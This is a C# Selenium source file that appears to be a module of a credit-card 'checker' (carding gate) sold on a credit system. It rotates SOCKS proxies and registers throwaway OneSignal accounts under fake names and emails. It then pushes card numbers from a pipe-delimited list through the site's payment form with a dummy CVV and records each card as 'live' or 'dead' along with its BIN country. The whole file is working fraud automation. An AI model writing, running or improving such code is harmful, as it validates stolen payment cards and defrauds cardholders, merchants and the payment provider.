using gateBeta.gates;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace gateDanny.gates
{
    class Onesignal
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }

        private bool tiempoElementoeMAIL(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='refresh']")))
                    {
                        driver.FindElement(By.XPath("//*[@id='refresh']")).Click();
                        Thread.Sleep(1000);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        private bool tiempoElementoeMAILTR(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='inbox']/table/tbody/tr")))
                    {
                        driver.FindElement(By.XPath("//*[@id='inbox']/table/tbody/tr")).Click();
                        Thread.Sleep(1000);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }

        public void load()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }

            var lines = Form1.listCC.Lines.Count();
            if (lines > 0 && Variables.run == true)
            {
                try
                {



                    Form1.circularProgressBar1.Value = 5;
                    var chromeOptions = new ChromeOptions();
                    correo = "joseffernana" + getNum() + "@gmail.com";
                    clave = "Jo." + getNum();

                    Socks socks = new Socks();
                    var prox = socks.proxy();

                    if (prox.Trim() == "0" || prox.Trim() == "")
                    {
                        MessageBox.Show("No hay socks disponibles");
                        return;
                    }

                    var ip = prox.Split(':');

                    var ipUp = ip[1].ToString().Replace("//", "");

                    //chromeOptions.AddArguments(new List<string>() { "headless" });
                    //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, 
                    chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--proxy-server=" + prox, "--ignore-certificate-errors", "--headless");

                    var chromeDriverService = ChromeDriverService.CreateDefaultService();
                    chromeDriverService.HideCommandPromptWindow = true;
                    driver = new ChromeDriver(chromeDriverService, chromeOptions);
                    try
                    {
                        driver.Url = "https://app.onesignal.com/signup?plan=growth";
                    }
                    catch (Exception)
                    {
                        socks.proxyUp(ipUp);
                        restart();
                    }
                    
                    Thread.Sleep(1000);
                    correo = "joseffernana" + getNum() + "@hotmail.com";

                    if (IsElementPresent(By.XPath("/html/body")))
                    {
                        if (driver.FindElement(By.XPath("/html/body")).Text.Trim() == "Backend not available")
                        {
                            socks.proxyUp(ipUp);
                            restart();
                        }
                    }

                    if (IsElementPresent(By.XPath("/html/body/div/div[1]/h1")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div/div[1]/h1")).Text.Trim() == "Custom Message")
                        {
                            socks.proxyUp(ipUp);
                            restart();
                        }
                    }

                    if (IsElementPresent(By.XPath("/html/body/h2")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/h2")).Text.Trim() == "502 Bad Gateway")
                        {
                            socks.proxyUp(ipUp);
                            restart();
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='titles']/h1")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='titles']/h1")).Text.Trim() == "ERROR")
                        {
                            socks.proxyUp(ipUp);
                            restart();
                        }
                    }

                    if (tiempoElemento(By.Id("field_email")))
                    {
                        //GetEmail();

                        Form1.circularProgressBar1.Value = 50;
                        Thread.Sleep(1000);
                        driver.FindElementById("field_email").SendKeys(correo);
                        Thread.Sleep(100);
                        driver.FindElementById("field_password").SendKeys(".Dav" + RandomNumber(500, 90000));
                        Thread.Sleep(100);
                        driver.FindElementById("field_company_name").SendKeys(correo);
                        Thread.Sleep(100);
                        driver.FindElementByXPath("//*[@id='signup-form']/fieldset/div/div[7]/p/button").Submit();
                        Thread.Sleep(100);
                        if (tiempoElemento(By.Name("firstName")))
                        {

                            pago();
                        }
                        else
                        {
                            restart();
                        }


                    }
                    else
                    {
                        restart();
                    }



                    Thread.Sleep(1000);



                }
                catch (Exception ex)
                {

                    if (Variables.run == true)
                    {
                        restart();
                    }
                    else
                    {
                        stop();
                    }
                }

            }
            else
            {
                stop();
            }
        }

        private void GetEmail()
        {


            //###--obtener email--#####
            ((IJavaScriptExecutor)driver).ExecuteScript("window.open();");
            driver.SwitchTo().Window(driver.WindowHandles.Last());
            Thread.Sleep(300);
            driver.Url = "https://www.abandonmail.com/es";
            Thread.Sleep(5000);

            if (tiempoElemento(By.XPath("//*[@id='randombtn']")))
            {
                driver.FindElement(By.XPath("//*[@id='randombtn']")).Click();
                Thread.Sleep(1000);
            }
            else
            {

                restart();
            }

            if (tiempoElemento(By.XPath("//*[@id='emailtouse']")))
            {
                correo = driver.FindElement(By.XPath("//*[@id='emailtouse']")).GetAttribute("value");
                Thread.Sleep(1000);
            }
            else
            {

                restart();
            }

            Thread.Sleep(3000);

            driver.SwitchTo().Window(driver.WindowHandles.First());



        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1500);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {
                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0 && Variables.run == true)
                {
                    if (pagos < 3)
                    {
                        Form1.circularProgressBar1.Value = 90;
                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];




                        if (tiempoElemento(By.XPath("/html/body/div[1]/div/div[2]/div[2]/form/div/div[3]/div/div/div/div/iframe")))
                        {

                            driver.FindElementByName("firstName").SendKeys("JOEL");
                            Thread.Sleep(100);
                            driver.FindElementByName("lastName").SendKeys("REYES");
                            Thread.Sleep(100);
                            driver.FindElementByName("address").SendKeys("STREET  " + RandomNumber(1000, 25489));
                            Thread.Sleep(100);
                            driver.FindElementByName("city").SendKeys("MIAMI");
                            Thread.Sleep(100);
                            driver.FindElementByName("zip").SendKeys("33206");
                            Thread.Sleep(100);
                            var country = new SelectElement(driver.FindElementById("country"));
                            country.SelectByValue("US");
                            Thread.Sleep(1000);
                            driver.FindElement(By.XPath("/html/body/div[1]/div/div[2]/div[2]/form/div/div[6]/div/div/div/label/span")).Click();
                            Thread.Sleep(1000);

                            driver.SwitchTo().Frame(driver.FindElementByXPath("/html/body/div[1]/div/div[2]/div[2]/form/div/div[3]/div/div/div/div/iframe"));
                            Thread.Sleep(1000);
                            driver.FindElement(By.Id("recurly-hosted-field-input")).SendKeys(ccnum);
                            Thread.Sleep(200);
                            driver.FindElement(By.XPath("/html/body/form/div/input[2]")).SendKeys(ccLine[1]);
                            Thread.Sleep(200);
                            driver.FindElement(By.XPath("/html/body/form/div/input[2]")).SendKeys(ccLine[2].Remove(0, 2));
                            Thread.Sleep(200);
                            if (ccLine[3].Trim().Length == 3)
                            {
                                driver.FindElement(By.XPath("/html/body/form/div/input[3]")).SendKeys("000");
                            }
                            else
                            {
                                driver.FindElement(By.XPath("/html/body/form/div/input[3]")).SendKeys("0000");
                            }

                            driver.SwitchTo().ParentFrame();
                            Thread.Sleep(1000);

                            driver.FindElement(By.XPath("/html/body/div[1]/div/div[2]/div[2]/form/div/div[7]/div/button")).Click();
                            Thread.Sleep(3000);


                        }
                        else
                        {
                            restart();
                        }

                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    stop();
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                restart();
            }

        }




        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.ToString());
            }

        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {

                    if (IsElementPresent(By.XPath("/html/body/div[1]/div/div[2]/div[2]/form/div/div[1]/div[2]/p")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[1]/div/div[2]/div[2]/form/div/div[1]/div[2]/p")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[1]/div/div[2]/div[2]/form/div/div[1]/div[2]/p")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='main']/div/div/div/div/h1")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='main']/div/div/div/div/h1")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='main']/div/div/div/div/h1")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }





                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                Thread.Sleep(1000);
                driver.Navigate().Refresh();
                Thread.Sleep(2000);

                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

